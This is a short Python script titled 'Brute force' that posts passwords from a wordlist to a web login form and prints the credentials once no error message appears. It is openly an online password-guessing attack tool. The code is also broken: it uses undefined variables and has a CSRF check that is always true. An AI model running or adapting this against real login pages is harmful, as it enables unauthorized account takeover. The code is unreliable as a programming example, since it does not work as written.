######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################


z = """"""

import requests

error = input("[+] Enter Wrong Password Error Message: ")


def cracker(url, error, wordlist, username):
    try:
        count = 0
        for password in wordlist:
            password = password.strip()
            count = count + 1
            print("Trying Password: " + str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username, "Password": password, "Log In": "submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")


cracker(url=url , wordlist=wordlist, error=error , username=username)
